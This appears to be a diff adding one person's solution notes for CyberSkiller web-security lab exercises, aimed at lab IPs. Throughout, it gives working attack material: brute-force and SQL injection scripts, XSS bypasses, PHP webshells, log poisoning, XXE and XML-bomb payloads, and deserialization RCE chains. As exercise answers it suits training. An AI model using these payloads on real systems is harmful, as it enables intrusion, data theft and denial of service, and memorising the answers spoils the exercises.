@@ -1,0 +1,456 @@
+-----Introduction to web application security-------------
+
+1.Response headers preview
+
+F12 -> Network -> [sign in] -> post request -> Headers -> response Headers -> Cyberskiller-Secret
+
+2.Manipulating HTTP parameters
+
+10.0.0.0/?id=0
+
+3.Launch and configuration of proxy in a browser
+Download owasp
+
+4.Automatic application scan
+Download owasp 
+cd [owasp]
+./zap.sh
+Automated scan -> [put id] -> [start attack] -> [find */robots.txt] ->[response] -> body 
+
+5.Modification of HTTP requests
+
+F12 -> Network -> Get request -> edit and resend ->  User-Agent : CyberSkiller -> [Send] -> response
+
+6.Repeating HTTP request
+firefox -> prefereces -> proxy -> manual 127.0.0.1 8080 -> run burp suite -> proxy -> intercept -> intercept is off -> send to repeater -> repeater -> go -> Raw
+or
+open owasp zap ->start attack -> [click get request] -> request -> [right click] -> open/resend -> send
+
+7.Finding the right parameter value by brute force method
+
+[Open owasp zap] -> http://10.0.0.0/?id=1 [Attack] -> history -> [Right click] Attack -> Fuzz -> Add numerzz from 1 to 10 000 -> sort -> get smallest response
+ 
+
+------- User Auntentication--------
+
+1.Low-complexity user password
+[download passwords]
+hydra 10.0.0.0 -s 80 -l admin -P passwords -t 64 -T 64 http-post-form "/:username=^USER^&password=^PASS^&submit=Submit:failed"
+
+2.Weak randomness session indentifier
+gedit p.py
+
+	import requests
+	for i in range(300):
+		r = requests.get('http://10.0.0.0/',cookies ={'CyberSkillerSESSID':str(i)})
+		if 'Admin Panel' in r.text:
+			print i
+pyton p.py
+[Log In] -> F12 -> Storage -> [Change value]
+
+3.Client-side authentication
+
+[View page source] -> [Get Login, Password] -> Login
+
+4.Incorrect password reset implementation
+
+	import requests
+	for i in range(1300):
+		r = requests.get('http://10.0.0.0/reset-password?id=JfXFX'+str(i))
+		if 'invalid' not in r.text:
+			print i
+
+'http://10.0.0.0/reset-password?id=JfXFX91
+[Reset]
+[Login]
+
+
+5.User enumeration based on response time
+
+open owasp zap
+manual open browser
+fuzz attack -> string -> copy paste login
+
+
+
+-------------Function and data access control ---------------------------
+
+1.Access to hidden pages
+
+10.0.0.0/admin
+
+2.Security flaw in acces to API
+f12 -> network -> [Search] -> Get request -> open in new tab -> 10.0.0.0/api/?controller=user&action=delete&user=CyberSkiller
+
+3.HTTP parameters manipulation
+f12 -> netowrk -> [send button] -> post request -> edit and resend -> change price to -X -> response
+
+4.Path Traversal valnerability
+10.0.0.0/?image=../../../../secret.txt
+view source 
+decode message
+
+5.Insecure Direct Object Reference vulnerability
+
+log in
+open a random file
+10.0.0.0/............./secret.txt
+
+------------------SQL injection---------------------
+
+1.Classic SQL injection vulnerability
+
+Login: CyberSkiller" -- a
+Password : 123
+
+2.Reading the database shema
+10.0.0.0/?query="union select table_name from information_schema.tables -- a
+
+3.Indentification of the database server version
+
+	10.0.0.0/?query="union select FETUTCDATE() -- a
+
+4.Blind SQL injection vulnerability
+gedit p2.py
+
+import requests
+l = "http://10.0.0.0/?query=XXXXX%22+union+select+username+from+users+where+username+%3D%27CyberSkiller%27+and+password+like+%27cs{}%25%27+--++a"
+password =''
+for k in range(10):
+	for i in range(10):
+		r = requests.get(l.format((password+str(i))))
+		if 'does exist' in r.text:
+			password+=str(i)
+			break;
+print(password)
+
+
+
+5.Time-based SQL injection vulerability	
+gedit p3.py
+
+import requests
+import time
+import string
+
+def check_password(password):
+	l = 'http://10.0.0.0/?query="+union+select+if(password+like"{}%25"%2C+sleep(1)%2C+"a")+from+users+where+username+%3D+"CyberSkiller"+--+a'
+	u = l.format(password)
+	
+	start = time.time()
+	requests.get(u)
+	end = time.time()
+	return (end-start)>1
+password ="CS"
+
+while True:
+	f = False
+	for c in string.ascii_uppercase+string.digits:
+		if check_password(password+c):
+			password = password+c
+			f = True
+			break
+	if not f:
+		break
+	print(password)
+
+
+-----------CROSS SITE SCRIPTING------------------
+
+1.Stored XSS valnerability
+	<script>alert(1)</script> [as a input and submit]
+
+2.Reflected XSS valnerability
+	<script>alert(1)</script> [as a part of url ?query= <script>alert(1)</script>]
+
+3.DOM XSS valnerability
+	00.00.00.00/?language=<script>alert(1)</script>
+
+4.XSS valnerability (other vector)
+	-> Network -> Post request -> Edit and Resend
+	"><script>alert(1)</script><img alt="
+
+5.XSS vulnerability (filtering tags)
+	AAA<scr<script>ipt>alert(0)</sc<script>ript>BBB
+
+6.XSS vulnerability (improved tag filltering)
+	AAA<img onerror=alert(1) src=x/>
+
+7.XSS vulnerability (input validation)
+	AAA<svg/onload=alert(9)>BBBB
+
+-----------HANDLING DATA FROM AN UNTRUSTED SOURCE------------------
+1.Reading an unexpected file
+	00.00.00.00/?page=../secret.txt
+
+2.Reading an unexpected file with the use of PHP filters
+	00.00.00.00/?page=php://filter/convert.base64-encode/resource=secret
+	decode base64 - google
+
+3.Running a malicious command by uploading a file
+	gedit webshell.php
+	<?php system($_GET['cmd']); ?> [upload file]
+	00.00.00.00/uploads/webshell.php?cmd=ls
+	00.00.00.00/uploads/webshell.php?cmd=cat secret.txt
+
+4.Secure file upload
+	gedit .htaccess
+	[upload] [ctrl + h = displays hidden files]
+	gedit access.php
+		<?php echo system('ls -la'); ?>
+	-> Network -> Post request -> Edit and Resend [post]
+		Contetnt-Type:text/plain
+	00.00.00.00/uploads/somethingOdd.txt
+
+5.Remove reading of an unexpected file
+	Open second page
+		<?php echo file_get_contents('secret.php');?> [save][open raw][copy link]
+	Open first page
+		00.00.00.00/?page = $link	[view page source]
+
+6.Standard Web Application Firewall (WAF)
+	00.00.00.00/?page= xd	[get path to directory]
+	00.00.00.00/?page= $path/secret
+
+7.Protected files download (WAF)
+	 Download motd [use as base for each http://localhost[...]]
+	[redirect] http://localhost:8080/aa http://localhost:8080/bb
+	[get created link] [encode it - url]
+	[remove bb from url and add .html at the end]
+	[Find href="somethingOdd.txt" ]
+	[redirect] http://localhost:8080/aa.html http://localhost:8080/somethingOdd.txt
+	[decode it -url]
+
+8.Insecure log browser
+	-> Network -> Get request [/] -> Edit and Resend
+	<?php echo '----------'. file_get_contents('./secret.txt').'-------'?> [From error get path]
+	<?php echo '----------'. file_get_contents('/var/www/secret.txt').'-------'?>
+
+9.Secure log browser
+	add /?test at the end of url and open it
+	-> Network -> Get request [/] -> Edit and Resend
+		X-Forwarded-For: <?php echo system("ls /var/www") ?>
+	
+		X-Forwarded-For: <?php echo system("cat /var/www/secret.txt") ?>
+
+10.Sending e-mails
+	title www-data
+	title xd
+	test <?php echo system('ls -la /var/www');?>
+	
+	00.00.00.00/?page=/var/mail/www-data [view page source] [get somethingOdd.txt (at the end of page)]
+	00.00.00.00/?page=/var/www/somethingOdd.txt
+
+
+----------- Unprotected parsing of XML files
+
+1.Unprotected parsing of XML files
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo[
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "../secret.txt" >]>
+    <data>
+        <name>
+            <first>&xxe;</first>
+            <last>Wick</last>
+        </name>
+        <name>
+            <first>Anna</first>
+            <last>Belle</last>
+        </name>
+    </data>
+                    
+
+2.Daniel of service attack with the use of an XML bomb
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+    <data>
+        <name>
+<lolz>&lol9;</lolz>
+            <first>John</first>
+            <last>Wick</last>
+        </name>
+        <name>
+            <first>Anna</first>
+            <last>Belle</last>
+        </name>
+    </data>
+
+3.Unprotected object deserialization
+
+O:17:"GreetingGenerator":1:{s:13:"greeting_file";s:13:"../secret.txt";}
+
+
+
+4.Protected parsing of XML files
+
+//second window
+<!ENTITY xxe SYSTEM "file:////var/www/secret.txt" >
+
+//first window
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r[
+<!ELEMENT r ANY>
+<!ENTITY % sp SYSTEM "http://10.0.11.28/raw/ariboveziq">
+%sp;
+]>
+    <data>
+        <name>
+            <first>&xxe;</first>
+            <last>Wick</last>
+        </name>
+        <name>
+            <first>Anna</first>
+            <last>Belle</last>
+        </name>
+    </data>
+                    
+    
+   
+
+5.From deserialization of the object to code execution on the server
+
+
+gedit script.php
+
+<?php
+class TextClass{
+
+    function __construct(){
+        $file_contents = file_get_contents("file.txt");
+        print $file_contents;
+    }
+}
+
+class HelperClass{
+
+    public $file = "./sh.php";
+
+    function load_data($data){
+        file_put_contents($this->file, $data);
+    }
+}
+
+class MainClass{
+
+    public $obj;
+    public $data;
+
+    function __construct($data) {
+        $this->data = $data;
+    }
+
+    function __wakeup(){
+        if(isset($this->obj)){
+            $this->obj->load_data($this->data);
+        }
+    }
+}
+
+$o = new MainClass('<?php system ($_GET["cmd"]); ?>');
+$o->obj = new HelperClass();
+echo serialize($o);
+?>
+
+php scirpt.php
+
+O:9:"MainClass":2:{s:3:"obj";O:11:"HelperClass":1:{s:4:"file";s:8:"./sh.php";}s:4:"data";s:31:"<?php system ($_GET["cmd"]); ?>";}
+http://10.0.47.120/sh.php?cmd=cat%20../secret.txt
+
+
+
+
+6.Real attack on the framework using object deserialization
+
+git clone https://github.com/ambionics/phpggc
+cd phpggc
+./phpggc CodeIgniter4/RCE1 system "cat /var/www/secret.txt" -o rce.txt
+base64 -w 0 rce.txt
+[copy/paste output]
+Network -> post -> edit and resend
+Cookie: user_obj=TzozOToiQ29kZUlnbml0ZXJcQ2FjaGVcSGFuZGxlcnNcUmVkaXNIYW5kbGVyIjoxOntzOjg6IgAqAHJlZGlzIjtPOjQ1OiJDb2RlSWduaXRlclxTZXNzaW9uXEhhbmRsZXJzXE1lbWNhY2hlZEhhbmRsZXIiOjI6e3M6MTI6IgAqAG1lbWNhY2hlZCI7TzoxNzoiQ29kZUlnbml0ZXJcTW9kZWwiOjU6e3M6MTA6IgAqAGJ1aWxkZXIiO086MzI6IkNvZGVJZ25pdGVyXERhdGFiYXNlXEJhc2VCdWlsZGVyIjowOnt9czoxMzoiACoAcHJpbWFyeUtleSI7TjtzOjE1OiIAKgBiZWZvcmVEZWxldGUiO2E6MTp7aTowO3M6ODoidmFsaWRhdGUiO31zOjE4OiIAKgB2YWxpZGF0aW9uUnVsZXMiO2E6MTp7czoyOiJpZCI7YToxOntzOjU6InJ1bGVzIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czoxMzoiACoAdmFsaWRhdGlvbiI7TzozMzoiQ29kZUlnbml0ZXJcVmFsaWRhdGlvblxWYWxpZGF0aW9uIjoxOntzOjE1OiIAKgBydWxlU2V0RmlsZXMiO2E6MTp7aTowO3M6NToiZmluZm8iO319fXM6MTA6IgAqAGxvY2tLZXkiO3M6MjM6ImNhdCAvdmFyL3d3dy9zZWNyZXQudHh0Ijt9fQ==
+[view response]
+
+
+
+------------------Configuration Errors
+
+1.Publicly accessible administation panel
+
+[find/copy/gedit f.txt/paste]
+
+wpscan --url http://10.0.0.0 -U CyberSkiller -P f.txt
+
+http://10.0.0.0/wp-admin.php
+
+
+
+2.Insecure database server configuration
+
+install mongodb-linux
+[open it]
+mongostat -h 10.0.0.0
+mongodump -h 10.0.0.0
+ls
+cd dump/admin
+cat exercise_flag.bson
+
+
+
+3.Publicly accessible development server
+
+sudo wget -r http://10.0.12.21/.git/
+cd 10.0.12.21
+git status
+git checkout .
+git status
+cd static/.htaccess
+git log [init comit]
+git checkout [id init comit]
+cd ../../
+cat secret.txt
+
+4.Using default passwords
+
+Login [ admin   geoserver]
+[server logs - download]
+grep CS geoserver.log
+
+
+5.Outdated software with known vulnerabilities
+
+wpscan --url http://10.0.15.186
+http://10.0.15.186/wp-admin/edit.php?post=type=wd_ads_ads&export=export_csv&path=../../secret.txt
+
+6 Publicly avaible backup
+
+gobuster dir -u http://10.0.15.206/ -w /usr/share/dirb/wordlists/common.txt
+
+gobuster dir -u http://10.0.15.206/backups/ -w /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://10.0.15.206/backups/ -w /usr/share/dirb/wordlists/common.txt -x zip
+
+http://10.0.0.0/backups/backup.zip [download]
+xdg-open .
+
+
+7 Browsing public code repository
+git clone https://github.com/internetwache/GitTools
+cd GitTools/Dumper
+./gitdumper.sh http://10.0.90.107/.git/ ~/git-repo/
+cd ~/git-repo
+sudo git checkout . 
+cat secrets/secret.txt
